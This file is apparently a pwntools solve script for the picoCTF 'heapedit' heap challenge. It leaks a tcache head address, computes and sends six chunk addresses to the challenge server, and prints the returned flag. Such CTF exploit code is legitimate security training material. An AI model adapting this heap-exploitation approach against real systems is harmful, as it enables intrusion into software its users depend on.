#!/usr/bin/env python3

from pwn import *

exe = ELF("./heapedit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

CHUNK_COUNT = 6
CHUNK_SIZE = 0x80
METADATA_SIZE = 0x10
TOTAL_CHUNK_STEP = CHUNK_SIZE + METADATA_SIZE


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("candy-mountain.picoctf.net", 51821)

    return r


def main():
    r = conn()

    r.recvuntil(b"-> ")
    head_addr_hex = r.recvline().strip().decode()
    head_addr = int(head_addr_hex, 16)
    log.info(f"tcache head: {hex(head_addr)}")

    chunks = [head_addr + (i * TOTAL_CHUNK_STEP) for i in range(CHUNK_COUNT)]

    for i in range(CHUNK_COUNT):
        r.recvuntil(f"Chunk {i+1} address: ".encode())
        current_address = hex(chunks[i])
        log.success(f"Sending address for Chunk {i+1}: {current_address}")
        r.sendline(current_address.encode())

    r.recvuntil(b"Flag: ")
    flag = r.recvline().strip().decode()
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()
